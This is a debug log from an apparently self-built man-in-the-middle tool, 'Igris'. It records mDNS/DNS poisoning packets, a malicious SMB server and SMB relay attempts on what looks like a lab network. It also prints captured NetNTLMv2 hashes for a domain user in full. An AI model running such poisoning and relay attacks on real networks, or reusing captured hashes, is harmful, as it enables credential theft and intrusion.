2021-11-13 16:16:25.885 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:25.886 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:26.880 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:26.881 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:26.885 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:26.886 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:26.890 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:26.890 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:26.894 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:26.895 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:38.298 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-13 16:16:38.299 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:16:38.307 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49932)
2021-11-13 16:16:38.308 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:16:38.310 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-13 16:16:38.310 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:16:52.653 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:52.653 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:52.653 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:16:52.684 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:52.685 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:52.685 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:16:55.270 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.271 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:55.276 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.276 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:55.319 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.320 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:55.325 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.325 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:55.550 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.551 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:55.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:55.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.259 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.260 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.317 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.318 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.322 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.322 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.536 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.536 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:16:56.540 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:16:56.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.237 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.238 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.240 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:17:00.281 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.281 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.281 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:17:00.314 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.314 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.315 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.317 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.317 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:00.319 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:00.319 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:01.250 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:01.251 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:01.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:01.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:04.712 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:17:24.585 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:17:24.586 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:17:24.591 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 16:17:24.598 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 16:17:24.599 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 16:17:24.603 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 16:17:24.603 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:17:24.611 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 16:17:24.612 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:17:24.613 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 16:17:24.614 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:17:28.707 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:28.707 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:28.708 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:17:28.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:28.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:28.742 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:17:28.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:28.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:28.784 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:28.784 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:29.714 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49935)
2021-11-13 16:17:29.716 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:17:29.748 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 16:17:29.750 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:17:29.752 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:47 - dict_keys([])
2021-11-13 16:17:29.754 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 16:17:29.755 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:29.757 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:e1e2bce4546cb79b7e38e023042294f3:010100000000000080b245f4a9d8d701e90129a7fb9648ea000000000100100058004d0047006a0061005300580054000300100058004d0047006a006100530058005400020010007a006f00500078004f0049006d004a00040010007a006f00500078004f0049006d004a000700080080b245f4a9d8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009004e0063006900660073002f0063006f00630068006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f00650065002e006c006f00630061006c000000000000000000
2021-11-13 16:17:29.758 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:29.759 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:55 - holiiiiiij
2021-11-13 16:17:29.760 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-13 16:17:29.761 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:29.783 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 16:17:29.783 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:31.242 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:31.242 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:31.244 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:31.244 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:31.246 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:31.246 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:31.248 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:31.249 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:32.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:32.253 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:32.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:17:32.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:17:40.533 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-13 16:17:40.536 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:40.546 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49935)
2021-11-13 16:17:40.549 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:17:40.551 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-13 16:17:40.554 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:12.568 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:18:13.557 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:18:13.557 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:18:13.560 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 16:18:13.567 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 16:18:13.568 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 16:18:13.573 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 16:18:13.576 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:13.584 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 16:18:13.586 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:13.594 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 16:18:13.597 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:20.139 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:18:24.708 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:18:24.709 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:18:24.711 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 16:18:24.716 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 16:18:24.717 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 16:18:24.720 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 16:18:24.726 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:24.727 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 16:18:24.727 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:24.728 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 16:18:24.728 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:31.727 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:31.727 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:31.728 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:18:31.765 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:31.765 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:31.765 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:18:31.801 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:31.801 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:31.803 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:31.803 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.650 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.650 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.652 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.652 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.653 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.653 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.724 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.724 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.725 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:32.726 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:32.741 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49948)
2021-11-13 16:18:32.741 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:32.750 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 16:18:32.751 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {}
2021-11-13 16:18:32.751 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:47 - dict_keys([])
2021-11-13 16:18:32.751 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 16:18:32.752 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:32.752 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1d46973e89eb6e2bc7b5e937d0315c17:010100000000000000bcd219aad8d7010c52a37e31d50c160000000001001000760049004600680062004b0052005a0003001000760049004600680062004b0052005a000200100078006b004a004a0042004500720042000400100078006b004a004a0042004500720042000700080000bcd219aad8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009004e0063006900660073002f0063006f00630068006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f00650065002e006c006f00630061006c000000000000000000
2021-11-13 16:18:32.753 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:32.753 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:55 - holiiiiiij
2021-11-13 16:18:32.753 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-13 16:18:32.754 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:32.773 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 16:18:32.774 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:33.642 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:33.642 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:33.644 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:33.644 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:33.645 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:33.646 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:33.647 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:18:33.647 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:18:43.477 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-13 16:18:43.479 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:43.486 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49948)
